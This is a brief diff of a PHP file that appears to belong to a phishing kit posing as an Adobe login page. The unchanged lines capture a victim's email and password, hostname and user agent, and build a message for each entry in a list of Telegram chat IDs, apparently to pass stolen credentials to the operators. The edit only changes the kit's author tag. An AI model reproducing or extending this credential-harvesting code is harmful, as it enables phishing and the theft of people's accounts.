@@ -15,7 +15,7 @@ if($email != null && $password != null){
 	$hostname = gethostbyaddr($ip);
 	$useragent = $_SERVER['HTTP_USER_AGENT'];
 	 foreach($IdTelegram as $chatId) {
-	$message = "|----------| ABODE LOGIN [ BY GIONEE ] |--------------|\n";
+	$message = "|----------| ABODE LOGIN [ BY JAMBA JUJU ] |--------------|\n";
 	$message .= "Online ID            : ".$email."\n";
 	$message .= "Passcode              : ".$password."\n";
 	$message .= "|--------------- I N F O | I P -------------------|\n";
